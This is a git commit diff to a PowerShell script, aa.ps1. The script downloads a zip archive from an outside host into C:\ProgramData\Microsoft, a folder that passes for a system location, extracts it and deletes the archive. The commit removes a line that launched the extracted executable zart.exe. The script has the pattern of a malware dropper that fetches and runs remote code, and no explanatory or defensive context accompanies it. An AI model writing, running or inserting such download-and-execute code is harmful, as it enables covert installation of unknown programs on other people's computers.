c278ddcd4f6eea2b36dfd8fb6f76d5a520291118
Raroford32 <109440929+Raroford32@users.noreply.github.com>
2024-08-08 00:28:14 +0330

    Update aa.ps1

--- aa.ps1
+++ aa.ps1
@@ -2,4 +2,3 @@ Invoke-WebRequest -Uri "http://blanjio.com/zart.zip" -OutFile "C:\ProgramData\Mi
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 [System.IO.Compression.ZipFile]::ExtractToDirectory("C:\ProgramData\Microsoft\zart.zip", "C:\ProgramData\Microsoft")
 Remove-Item -Path "C:\ProgramData\Microsoft\zart.zip"
-Start-Process -FilePath "C:\ProgramData\Microsoft\zart.exe"
